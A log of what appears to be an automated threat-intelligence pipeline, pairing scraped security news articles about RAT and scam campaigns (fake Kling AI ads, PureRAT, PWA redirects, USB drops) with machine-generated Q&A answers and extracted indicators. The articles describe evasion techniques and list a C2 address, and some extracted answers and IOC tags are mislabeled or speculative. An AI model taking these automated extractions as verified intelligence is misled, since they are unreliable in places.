{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://blog.checkpoint.com/security/exploiting-the-ai-boom-how-threat-actors-are-targeting-trust-in-generative-platforms-like-kling-ai/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware deployed in this campaign is a remote access Trojan (RAT), which grants attackers remote control of the victim's system and the ability to steal sensitive data.", "question": "What kind of malware is it?"}, {"answer": "The attack involves a remote access Trojan (RAT) and uses social engineering tactics, including fake social media ads and a counterfeit website, to trick users into downloading malicious files.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware monitors the system, especially web browsers and extensions that store passwords or other sensitive data, giving attackers the ability to steal personal information.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The malware deployed in this campaign monitors the system, especially web browsers and extensions that store passwords or other sensitive data, giving attackers the ability to steal personal information. However, it is not explicitly stated that it steals credit cards or bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals sensitive data, including personal information and passwords stored in web browsers and extensions.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attackers' server, as indicated by a hidden configuration file that connects back to the server.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://blog.checkpoint.com/security/exploiting-the-ai-boom-how-threat-actors-are-targeting-trust-in-generative-platforms-like-kling-ai/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "fraud", "apt", "phishing", "malicious", "passwords", "browser"], "article_textual_content": "# Exploiting the AI Boom: How Threat Actors Are Targeting Trust in Generative Platforms like Kling AI\n\n- In early 2025, Check Point Research identified a cyber attack campaign exploiting the popularity of generative AI service, Kling AI. The attack began with deceptive social media ads leading to a fake website designed to trick users into downloading malicious files.\n- The attack used fake Facebook pages and ads to distribute a malicious file which ultimately led to the execution of a remote access Trojan (RAT), granting attackers remote control of the victim’s system and the ability to steal sensitive data.\n- The malware deployed in this campaign featured advanced evasion techniques, including file masquerading to disguise harmful executable files as harmless media files, and extensive anti-analysis methods to avoid detection.\n- Check Point’s threat emulation and Harmony Endpoint offer robust protection against the techniques and threats outlined in this campaign, ensuring defense against malicious files, remote access tools, and targeted social engineering attacks.\n\nAs generative AI continues to capture global attention, threat actors are quick to exploit AI’s capabilities and popularity. From deepfake scams to impersonation attacks, the rising trust in AI-powered platforms has created new openings for cyber criminals. In early 2025, Check Point Research began tracking a sophisticated threat campaign that capitalized on this trend, specifically by impersonating Kling AI, a widely used image and video synthesis tool with over 6 million users.\n\nThis campaign, propagated through false Facebook advertisements and spoofed pages, ultimately directed users to a counterfeit website designed to deliver a malicious payload. In this blog, we break down the tactics used in this campaign and examine how attackers are leveraging the credibility of generative AI services to deceive users and spread malware.\n\nFor a comprehensive understanding of the impersonation attack, read Check Point Research’s publication here.\n\n##### From Fake Ads to Fake Downloads\n\nThe attack begins with fake advertisements on social media. Since early 2025, our team has identified around 70 sponsored posts that falsely promote the popular AI tool Kling AI. These ads come from convincing but fraudulent Facebook pages designed to look like the real company.\n\nClicking on one of these ads leads users to a fake website that closely mimics Kling AI’s actual interface. Just like the real tool, the site invites users to upload images and click a “Generate” button to see AI-powered results. However, instead of delivering an image or video, the site offers a download—one that appears to be an archive file containing a new AI-generated media file.\n\nThe downloaded file is made to look like a harmless image, complete with a name like Generated\\_Image\\_2025.jpg and even a familiar image icon. However, behind this seemingly harmless appearance lies something dangerous: the file is a disguised program intended to compromise the user’s system. This technique—known as filename masquerading—is a common tactic used by threat actors to trick users into launching malicious software.\n\nOnce opened, the program quietly installs itself, ensures it can restart automatically every time the computer is turned on. It also checks for any signs that it’s being watched or analyzed by cyber security tools and tries to avoid detection.\n\n##### Stage 2: Silent Takeover with Remote Access Tools\n\nAfter the initial fake file is opened, a second, more serious threat is activated. This stage installs called a remote access Trojan (RAT), a malware that allows attackers to take control of the victim’s computer from a distance.\n\nEach version of this tool is slightly altered to avoid detection, but all include a hidden configuration file that connects back to the attackers’ server. These files also contain campaign names like “Kling AI 25/03/2025” or “Kling AI Test Startup,” suggesting ongoing testing and updates by the threat actors.\n\nOnce in place, the malware begins monitoring the system—especially web browsers and extensions that store passwords or other sensitive data—giving attackers the ability to steal personal information and maintain long-term access.\n\n##### A Familiar Playbook: Tracing the Campaign\n\nWhile the exact identity of the attackers remains unknown, evidence strongly suggests links to Vietnamese threat actors. Facebook-based scams and malware campaigns are a known tactic among groups from the region—especially those focused on stealing personal data.\n\nIn this case, our analysis revealed multiple clues pointing in that direction. Similar campaigns themed around AI tools have previously contained Vietnamese-language terms within the malware code. Consistent with that pattern, we found several references—such as debug messages—in Vietnamese in this latest campaign as well.\n\nThese findings align with broader trends observed by other security researchers investigating similar Facebook malvertising efforts.\n\n##### Defending Against the New Face of AI-Themed Threats\n\nAs generative AI tools grow in popularity, cyber criminals are finding new ways to exploit that trust. This campaign, which impersonated Kling AI through fake ads and deceptive websites, demonstrates how threat actors are combining social engineering with advanced malware to gain access to users’ systems and personal data.\n\nWith tactics ranging from file masquerading to remote access and data theft, and signs pointing to Vietnamese threat groups, this operation fits into a broader trend of increasingly targeted and sophisticated social media-based attacks.\n\nTo help organizations stay protected, Check Point threat emulation and Harmony Endpoint offer comprehensive coverage across attack methods, file types, and operating systems—effectively blocking the threats outlined in this report. As always, proactive threat detection and user awareness remain essential in defending against evolving cyber threats.\n\nFor a comprehensive understanding of the impersonation attack, read Check Point Research’s publication here.\n\n#### You may also like\n\n### Introducing Check Point MCP Servers: Integrate Check Point Cyber Security Capabilities Directly into Your AI Tools\n\nSecurity teams today need to move faster, prove compliance, and ...\n\n### From Classrooms to Code Red: 3,000+ Cyber Threats Hit U.S. Schools and Universities Weekly\n\nClassrooms and campuses have gone fully digital — and continue ...\n\n### Smart Networks, Smarter Threats: Securing Telecoms in the Age of AI and Critical Infrastructure\n\nAs we celebrate World Telecommunication and Information Society Day (WTISD) ...\n\n### Phishing Campaign Mimics Email Quarantine Notifications: 32,000 Emails Target 6,358 Customers\n\nIn a recent discovery, Check Point researchers have identified a ...\n\n- COMPANY\n    - About Us\n    - Careers\n    - Leadership\n    - Newsroom\n    - Legal\n    - Trust Center\n    - Investor Relations\n    - Merchandise Store\n    - Contact Us\n- TECHNICAL RESOURCES\n    - User Center Sign In\n    - Advisories\n    - Threat Map\n    - Threat Wiki\n    - URL Categorization\n    - App Wiki\n- EXPAND &amp; LEARN\n    - Resource Center\n    - Cyber Hub\n    - Check Point Research\n    - Check Point Blog\n    - CheckMates Community\n    - Customer Stories\n- SUPPORT &amp; SERVICES\n    - Support Center\n    - Infinity Global Services\n    - IGS Portal\n    - Contact Sales\n        - North America:\n        - +1-866-488-6691\n        - International:\n        - +44-125-333-5558\n    - Contact Support\n        - North America:\n        - +1-888-361-5030\n        - International:\n        - +44-114-478-2845"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/fake-kling-ai-facebook-ads-deliver-rat.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is a remote access Trojan (RAT), specifically the PureHVNC RAT, which allows attackers to gain remote control of the victim's system and steal sensitive data.", "question": "What kind of malware is it?"}, {"answer": "The attack involves social engineering and malvertising techniques to distribute a remote access Trojan (RAT) malware, which grants attackers remote control of the victim's system and allows them to steal sensitive data.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware exfiltrates browser-stored credentials, session tokens, and other sensitive data.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The malware, specifically the PureHVNC RAT, is capable of stealing data from several cryptocurrency wallet extensions installed on Chromium-based browsers, and it also captures screenshots when window titles matching banks and wallets are opened.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, the malware is related to a wallet stealer, specifically the PureHVNC RAT, which can steal data from several cryptocurrency wallet extensions installed on Chromium-based browsers.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals browser-stored credentials, session tokens, and other sensitive data, including data from cryptocurrency wallet extensions installed on Chromium-based browsers.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is exfiltrated to a command-and-control (C2) server, and in the case of the PureHVNC RAT, it contacts a remote server at the IP address 185.149.232[.]197.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations and institutions include banks and wallets, with window titles matching banks and wallets being captured by the PureHVNC RAT. The campaign is suspected to be from Vietnam, and the scam pages are operated from China, Sri Lanka, Vietnam, and the Philippines.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/fake-kling-ai-facebook-ads-deliver-rat.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "klingaimedia[.]com"}, {"type": "Domain or URL", "value": "klingaistudio[.]com"}, {"type": "Domain or URL", "value": "185.149.232[.]197"}, {"type": "IP Address", "value": "185.149.232.197"}], "keywords_found": ["analysis", "threat", "fraud", "intelligence", "wallet", "apt", "malicious", "botnet", "cryptocurrency", "bank", "dropper", "browser"], "article_textual_content": "# Fake Kling AI Facebook Ads Deliver RAT Malware to Over 22 Million Potential Victims\n\nCounterfeit Facebook pages and sponsored ads on the social media platform are being employed to direct users to fake websites masquerading as Kling AI with the goal of tricking victims into downloading malware.\n\nKling AI is an artificial intelligence (AI)-powered platform to synthesize images and videos from text and image prompts. Launched in June 2024, it's developed by Kuaishou Technology, which is headquartered in Beijing, China. As of April 2025, the service has a user base of more than 22 million, per data from the company.\n\n\"The attack used fake Facebook pages and ads to distribute a malicious file which ultimately led to the execution of a remote access Trojan (RAT), granting attackers remote control of the victim's system and the ability to steal sensitive data,\" Check Point said.\n\nFirst detected in early 2025, the campaign leads unsuspecting users to a spoofed website such as klingaimedia[.]com or klingaistudio[.]com, where they are asked to create AI-generated images or videos directly in the browser.\n\nHowever, the website does not generate the multimedia count as advertised. Rather, it offers the option to a purported image or video that, in reality, is a malicious Windows executable hidden using double extensions and Hangul Filler (0xE3 0x85 0xA4) characters.\n\nThe payload is included in a ZIP archive and acts as a loader to launch a remote access trojan and a stealer that then establishes contact with a command-and-control (C2) server and exfiltrates browser-stored credentials, session tokens, and other sensitive data.\n\nThe loader, besides monitoring for analysis tools such as Wireshark, OllyDbg, Procmon, ProcExp, PeStudio, and Fiddler, makes Windows Registry changes to set up persistence and launches the second-stage by injecting it into a legitimate system process like \"CasPol.exe\" or \"InstallUtil.exe\" to evade detection.\n\nThe second-stage payload, obfuscated using .NET Reactor, is the PureHVNC RAT that contacts a remote server (185.149.232[.]197) and comes with capabilities to steal data from several cryptocurrency wallet extensions installed on Chromium-based browsers. PureHVNC also adopts a plugin-based approach to capture screenshots when window titles matching banks and wallets are opened.\n\nCheck Point said it identified no less than 70 promoted posts from fake social media pages impersonating Kling AI. It's currently not clear who is behind the campaign, but evidence gathered from the fake website's web page and some of the ads show that they could be from Vietnam.\n\nThe use of Facebook malvertising techniques to distribute stealer malware has been a tried-and-tested tactic of Vietnamese threat actors, who have been increasingly capitalizing on the popularity of generative AI tools to push malware.\n\nEarlier this month, Morphisec revealed that a Vietnamese threat actor has been leveraging fake AI-powered tools as a lure to entice users into downloading an information stealer malware dubbed Noodlophile.\n\n\"This campaign, which impersonated Kling AI through fake ads and deceptive websites, demonstrates how threat actors are combining social engineering with advanced malware to gain access to users' systems and personal data,\" Check Point said.\n\n\"With tactics ranging from file masquerading to remote access and data theft, and signs pointing to Vietnamese threat groups, this operation fits into a broader trend of increasingly targeted and sophisticated social media-based attacks.\"\n\nThe development comes as The Wall Street Journal reported that Meta is battling an \"epidemic of scams,\" with cyber criminals flooding Facebook and Instagram with various kinds of scams ranging from romance baiting to sketchy bargain ads to fake giveaways. Many of the scam pages are operated from China, Sri Lanka, Vietnam, and the Philippines, the report added.\n\nAccording to Rest of World, phony job ads on Telegram, Facebook, and other social media are being increasingly used to lure young Indonesians and get trafficked to scam compounds in Southeast Asia, from where they are coerced into running investment scams and defraud victims across the world.\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.catonetworks.com/blog/cato-ctrl-suspected-russian-threat-actors/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/researchers-expose-pwa-javascript.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a Progressive Web App (PWA) JavaScript attack that redirects users to adult scam apps.", "question": "What kind of malware is it?"}, {"answer": "It involves a client-side attack that uses third-party JavaScript to inject malicious code and redirect mobile users to a scam app.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses malicious JavaScript injections to redirect site visitors to a scam app.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/researchers-expose-pwa-javascript.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "apt", "phishing", "malicious", "botnet", "dropper", "browser"], "article_textual_content": "# Researchers Expose PWA JavaScript Attack That Redirects Users to Adult Scam Apps\n\nCybersecurity researchers have discovered a new campaign that employs malicious JavaScript injections to redirect site visitors on mobile devices to a Chinese adult-content Progressive Web App (PWA) scam.\n\n\"While the payload itself is nothing new (yet another adult gambling scam), the delivery method stands out,\" c/side researcher Himanshu Anand said in a Tuesday analysis.\n\n\"The malicious landing page is a full-blown Progressive Web App (PWA), likely aiming to retain users longer and bypass basic browser protections.\"\n\nThe campaign is designed to explicitly filter out desktop users, primarily focusing on mobile users. The activity has been described as a client-side attack that uses third-party JavaScript and only triggers on mobile devices.\n\nThe use of PWAs, a type of application built using web technologies that provide a user experience similar to that of a native app built for a specific platform like Windows, Linux, macOS, Android, or iOS, is seen as an attempt to sidestep security protections.\n\nThe attacks involve injecting websites with JavaScript code that acts as a loader to trigger the redirection when the site is visited from devices running on Android, iOS, and iPadOS, among others.\n\nThe redirections are designed to lead the users to adult content websites or other intermediary redirect pages advertising apps for viewing adult content. The pages subsequently take the victims to a fake app store listing for the supposed Android and iOS apps in question.\n\n\"The use of PWAs suggests attackers are experimenting with more persistent phishing methods,\" Anand said. \"The mobile-only focus allows them to evade many detection mechanisms.\"\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://osintteam.blog/you-found-a-usb-stick-dont-plug-it-in-it-s-not-a-juice-box-e1ace9aae02a?source=rss----2983bc435765---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "It involves a USB Drop Attack, where a hacker leaves a malware-loaded USB drive in a public place, and someone plugs it in, compromising their device.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://osintteam.blog/you-found-a-usb-stick-dont-plug-it-in-it-s-not-a-juice-box-e1ace9aae02a?source=rss----2983bc435765---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://www.paypal.me/infosecmonk25"}], "keywords_found": ["threat", "intelligence"], "article_textual_content": "# OSINT Team\n\nFollow publication\n\nWe teach OSINT from multiple perspectives. InfoSec experts, journalists, law enforcement and other intelligence specialists read us to grow their skills faster.\n\nFollow publication\n\nMember-only story\n\n# “You Found a USB Stick? Don’t Plug It In, It’s Not a Juice Box!”\n\n## USB Drop Attacks in the Remote Work Era: Still Relevant?\n\n2 hours ago\n\n--\n\nShare\n\nPhoto by Hendrik Morkel on Unsplash\n\nWelcome back to Underrated Security — where we dig into those weird, often-overlooked threats that sound like bad movie plots… but are very real.\n\nToday, we’re throwing it back to a classic:\n\nThe USB Drop Attack.\n\nYup, that old trick where a hacker leaves a mysterious USB drive in the wild — and someone (ahem, maybe you) picks it up and plugs it in just to “see what’s on it.”\n\nNow you’re probably thinking:\n\n“Bro, it’s 2025. Aren’t we past that? We’re all remote now!”\n\nOh, my friend. Sit down. Grab a coffee.\n\nLet’s talk about why USB drop attacks are still alive, kicking, and sneakier than ever.\n\n# Quick Recap: What Is a USB Drop Attack?\n\nImagine this scenario:\n\n1. Hacker loads a USB with malware or a bad script\n2. Labels it “Payroll\\_Q1\\_2025” or “Layoffs\\_List” (spicy!)\n3. Drops it in the company parking lot or a co-working space\n4. Someone picks it up and… plugs it in.\n\n--\n\n--\n\n## Published in OSINT Team\n\nWe teach OSINT from multiple perspectives. InfoSec experts, journalists, law enforcement and other intelligence specialists read us to grow their skills faster.\n\n## Written by Bl@ckC!pH3r\n\nInfoSec Expert specializing in MS E5 Security, Cloud Security, &amp; Sec. Architecture. | AI-Sec Enthusiast | Buy me a ☕: https://www.paypal.me/infosecmonk25\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/purerat-malware-spikes-4x-in-2025.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is called PureRAT, a backdoor malware that allows attackers to gain unlimited access to infected systems and confidential organization data.", "question": "What kind of malware is it?"}, {"answer": "It involves a phishing campaign that distributes PureRAT malware, which is launched through a phishing email with a RAR file attachment or a link to the archive.", "question": "What kind of attack does it involve?"}, {"answer": "The malware, specifically the PluginWindowNotify module, checks the name of the active window for keywords like password, bank, WhatsApp, and performs follow-up actions, but it is not explicitly stated as using web inject. However, PluginClipper functions as a clipper malware, substituting cryptocurrency wallet addresses.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the PureLogs information stealer can harvest data from web browsers, including credentials.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, the PureRAT malware and PureLogs stealer can harvest data from web browsers, email clients, and other programs, including password managers and cryptocurrency wallet apps, potentially stealing credit card and bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, the PureRAT malware includes a module called PluginClipper, which functions as a clipper malware by substituting cryptocurrency wallet addresses copied to the system's clipboard with an attacker-controlled one. Additionally, PureLogs is an information stealer that can harvest data from cryptocurrency wallet apps.", "question": "Is it related to wallet stealer?"}, {"answer": "The PureLogs malware can harvest data from web browsers, email clients, VPN services, messaging apps, wallet browser extensions, password managers, cryptocurrency wallet apps, and other programs.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations are Russian organizations, but specific regions, banks, or wallets are not mentioned, except for the mention of targeting Russian firms and the malware checking for keywords like \"bank\" and \"WhatsApp\".", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/purerat-malware-spikes-4x-in-2025.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "wallet", "apt", "phishing", "malicious", "botnet", "cryptocurrency", "bank", "dropper", "browser", "backdoor", "keylogger"], "article_textual_content": "# PureRAT Malware Spikes 4x in 2025, Deploying PureLogs to Target Russian Firms\n\nRussian organizations have become the target of a phishing campaign that distributes malware called PureRAT, according to new findings from Kaspersky.\n\n\"The campaign aimed at Russian business began back in March 2023, but in the first third of 2025 the number of attacks quadrupled compared to the same period in 2024,\" the cybersecurity vendor said.\n\nThe attack chains, which have not been attributed to any specific threat actor, commence with a phishing email that contains a RAR file attachment or a link to the archive that masquerades as a Microsoft Word or a PDF document by making use of double extensions (\"doc\\_054\\_[redacted].pdf.rar\").\n\nPresent within the archive file is an executable that, when launched, copies itself to the \"%AppData%\" location of the compromised Windows machine under the name \"task.exe\" and creates a Visual Basic Script called \"Task.vbs\" in the Startup VBS folder.\n\nThe executable then proceeds to unpack another executable \"ckcfb.exe\", runs the system utility \"InstallUtil.exe,\" and injects into it the decrypted module. \"Ckcfb.exe,\" for its part, extracts and decrypts a DLL file \"Spydgozoi.dll\" that incorporates the main payload of the PureRAT malware.\n\nPureRAT establishes SSL connections with a command-and-control (C2) server and transmits system information, including 